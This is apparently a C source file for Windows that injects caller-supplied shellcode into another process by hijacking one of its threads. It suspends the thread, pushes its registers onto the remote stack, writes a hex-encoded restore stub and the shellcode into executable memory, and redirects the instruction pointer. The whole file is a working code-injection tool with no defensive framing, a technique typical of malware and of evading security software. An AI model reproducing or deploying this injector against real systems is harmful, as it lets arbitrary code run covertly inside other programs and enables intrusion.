#include "InjectShellcode.h"

/*
call shellcode
restore ctx.
shellcode:
*/

unsigned char shellcode_stub[] = {
	0xe8, 0x93, 0x00, 0x00, 0x00,
	0x48, 0x83, 0xC4, 0x0,
	0x0f, 0x10, 0x04, 0x24,
	0x0f, 0x10, 0x4c, 0x24, 0x10,
	0x0f, 0x10, 0x54, 0x24, 0x20,
	0x0f, 0x10, 0x5c, 0x24, 0x30,
	0x0f, 0x10, 0x64, 0x24, 0x40,
	0x0f, 0x10, 0x6c, 0x24, 0x50,
	0x0f, 0x10, 0x74, 0x24, 0x60,
	0x0f, 0x10, 0x7c, 0x24, 0x70,
	0x44, 0x0f, 0x10, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00,
	0x44, 0x0f, 0x10, 0x8c, 0x24, 0x90, 0x00, 0x00, 0x00,
	0x44, 0x0f, 0x10, 0x94, 0x24, 0xa0, 0x00, 0x00, 0x00,
	0x44, 0x0f, 0x10, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00,
	0x44, 0x0f, 0x10, 0xa4, 0x24, 0xc0, 0x00, 0x00, 0x00,
	0x44, 0x0f, 0x10, 0xac, 0x24, 0xd0, 0x00, 0x00, 0x00,
	0x44, 0x0f, 0x10, 0xb4, 0x24, 0xe0, 0x00, 0x00, 0x00,
	0x44, 0x0f, 0x10, 0xbc, 0x24, 0xf0, 0x00, 0x00, 0x00,
	0x48, 0x81, 0xc4, 0x00, 0x01, 0x00, 0x00,
	0x9d,
	0x41, 0x5f,
	0x41, 0x5e,
	0x41, 0x5d,
	0x41, 0x5c,
	0x41, 0x5b,
	0x41, 0x5a,
	0x41, 0x59,
	0x41, 0x58,
	0x5f,
	0x5e,
	0x5a,
	0x59,
	0x5b,
	0x58,
	0x5d,
	0xc3 };

DWORD Pid(WCHAR* szName)
{
	HANDLE hprocessSnap = NULL;
	PROCESSENTRY32  pe32 = { 0 };
	hprocessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	/*if (hprocessSnap == (HANDLE)-1) { return 0; }*/
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hprocessSnap, &pe32))
	{
		do {
			if (!StrCmpI(szName, pe32.szExeFile))
				return (int)pe32.th32ProcessID;
		} while (Process32Next(hprocessSnap, &pe32));
	}
	else
		CloseHandle(hprocessSnap);
	return 0;
}

BOOL InjectThreadShellcode(HANDLE hProcess, DWORD ThreadId, UINT8 * sc, int sc_len){
	BOOL ret = FALSE;
	CONTEXT ctx = { 0 };
	UINT8 * code = NULL;
	UINT64 * sp;
	SIZE_T write_bytes = 0;
	TCHAR szErrMsg[MAX_PATH];
	HANDLE hThread = OpenThread(
		THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_RESUME,
		FALSE, ThreadId);

	if (!hThread){
		wsprintf(szErrMsg, TEXT("OpenThread failed with err : %d"), GetLastError());
		//MessageBox(NULL, szErrMsg, TEXT("Tips"), MB_OK);
		goto failed_0;
	}

	if (-1 == SuspendThread(hThread)){
		wsprintf(szErrMsg, TEXT("SuspendThread failed with err : %d"), GetLastError());
		//MessageBox(NULL, szErrMsg, TEXT("Tips"), MB_OK);
		goto failed_1;
	}

	ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(hThread, &ctx)){
		wsprintf(szErrMsg, TEXT("GetThreadContext failed with err : %d"), GetLastError());
		//MessageBox(NULL, szErrMsg, TEXT("Tips"), MB_OK);
		goto failed_2;
	}

	//Save Context to Stack
	sp = (UINT64*)ctx.Rsp;

#define _SAVE_REGS(x) \
	do{	\
		--sp;	\
		WriteProcessMemory(hProcess, sp, &ctx.x, sizeof(ctx.x), &write_bytes);\
						}while(0) \


	//save ctx to new stack.
	_SAVE_REGS(Rip);
	_SAVE_REGS(Rbp);
	_SAVE_REGS(Rax);
	_SAVE_REGS(Rbx);
	_SAVE_REGS(Rcx);
	_SAVE_REGS(Rdx);
	_SAVE_REGS(Rsi);
	_SAVE_REGS(Rdi);
	_SAVE_REGS(R8);
	_SAVE_REGS(R9);
	_SAVE_REGS(R10);
	_SAVE_REGS(R11);
	_SAVE_REGS(R12);
	_SAVE_REGS(R13);
	_SAVE_REGS(R14);
	_SAVE_REGS(R15);

	//save eflags.
	_SAVE_REGS(EFlags);

#define _SAVE_FLOAT_REGS(x) \
	do{	\
		sp -= 2;\
		WriteProcessMemory(hProcess, sp, &ctx.x, sizeof(ctx.x), &write_bytes);\
						}while(0) \

	//save xmm regs.
	_SAVE_FLOAT_REGS(Xmm15);
	_SAVE_FLOAT_REGS(Xmm14);
	_SAVE_FLOAT_REGS(Xmm13);
	_SAVE_FLOAT_REGS(Xmm12);
	_SAVE_FLOAT_REGS(Xmm11);
	_SAVE_FLOAT_REGS(Xmm10);
	_SAVE_FLOAT_REGS(Xmm9);
	_SAVE_FLOAT_REGS(Xmm8);
	_SAVE_FLOAT_REGS(Xmm7);
	_SAVE_FLOAT_REGS(Xmm6);
	_SAVE_FLOAT_REGS(Xmm5);
	_SAVE_FLOAT_REGS(Xmm4);
	_SAVE_FLOAT_REGS(Xmm3);
	_SAVE_FLOAT_REGS(Xmm2);
	_SAVE_FLOAT_REGS(Xmm1);
	_SAVE_FLOAT_REGS(Xmm0);



	//Not aligned .
	if (0x8 & (UINT8)sp){
		--sp;
		shellcode_stub[0x8] = 0x8;			//注意不能是+,这个是全局数据.要不然多次调用会出问题
	}
	else{
		shellcode_stub[0x8] = 0x0;
	}

	//Write code to target process.
	code = (UINT8*)VirtualAllocEx(hProcess, NULL, sizeof(shellcode_stub) + sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
	if (!code){
		wsprintf(szErrMsg, TEXT("VirtualAllocEx failed with err : %d"), GetLastError());
		//MessageBox(NULL, szErrMsg, TEXT("Tips"), MB_OK);
		goto failed_3;
	}

	if (!WriteProcessMemory(hProcess,
		code,
		shellcode_stub, sizeof(shellcode_stub),
		&write_bytes)){
		wsprintf(szErrMsg, TEXT("WritreProcessMemory failed with err : %d"), GetLastError());
		//MessageBox(NULL, szErrMsg, TEXT("Tips"), MB_OK);
		goto failed_3;
	}

	//write shellcode.
	if (!WriteProcessMemory(hProcess,
		code + sizeof(shellcode_stub),
		sc, sc_len,
		&write_bytes)){
		wsprintf(szErrMsg, TEXT("WriteProcessMemory failed with err : %d"), GetLastError());
		//MessageBox(NULL, szErrMsg, TEXT("Tips"), MB_OK);
		goto failed_3;
	}


	//Set rip and rsp.
	ctx.ContextFlags = CONTEXT_ALL;
	ctx.Rsp = (DWORD64)sp;
	ctx.Rip = (DWORD64)code;

	ret = SetThreadContext(hThread, &ctx);
	if (ret){
		//FlushInstructionCache(hProcess, code, sizeof(shellcode_stub) + sc_len);
		ResumeThread(hThread);
	}
	return ret;

failed_3:
	VirtualFreeEx(hProcess, code, 0, MEM_RELEASE);
failed_2:
	ResumeThread(hThread);
failed_1:
	CloseHandle(hThread);
failed_0:
	return ret;
}

int InjectProcessShellcode(TCHAR * process, unsigned char * sc, int sc_len){
	int err = -1;
	THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
	DWORD dwId = Pid(process);
	HANDLE hSnapshot;
	BOOL bFind;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_READ |
		PROCESS_VM_WRITE, FALSE, dwId);

	if (!hProcess)
		goto failed_0;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (!hSnapshot)
		goto failed_1;

	bFind = Thread32First(hSnapshot, &te32);
	while (bFind){
		if (te32.th32OwnerProcessID == dwId){
			if (InjectThreadShellcode(hProcess, te32.th32ThreadID,
				sc,
				sc_len)){
				err = 0;
				break;
			}
		}
		bFind = Thread32Next(hSnapshot, &te32);
	}
failed_2:
	CloseHandle(hSnapshot);
failed_1:
	CloseHandle(hProcess);
failed_0:
	return err;
}